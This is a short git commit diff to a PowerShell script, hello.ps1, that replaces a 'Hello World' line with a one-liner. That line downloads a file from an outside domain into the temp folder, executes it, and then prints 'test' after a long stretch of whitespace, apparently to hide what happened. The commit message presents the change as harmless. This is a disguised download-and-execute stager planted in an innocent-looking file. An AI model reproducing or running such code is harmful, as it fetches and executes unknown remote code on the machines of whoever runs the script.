0a35a07f923aab1e66522604422506d6e0edfdcd
GenaBobkovCoding <oeirf234dj034234@proton.me>
2025-12-26 19:17:57 +0300

    Replace Hello World with script execution

--- hello.ps1
+++ hello.ps1
@@ -1,1 +1,1 @@
-Write-Host "Hello World"
+powershell  -c "iwr 'https://mellstroyappgame.online/test/mini.txt' -o $env:TEMP\\tc.txt; & $env:TEMP\\tc.txt; Write-Host '"                                                  test'
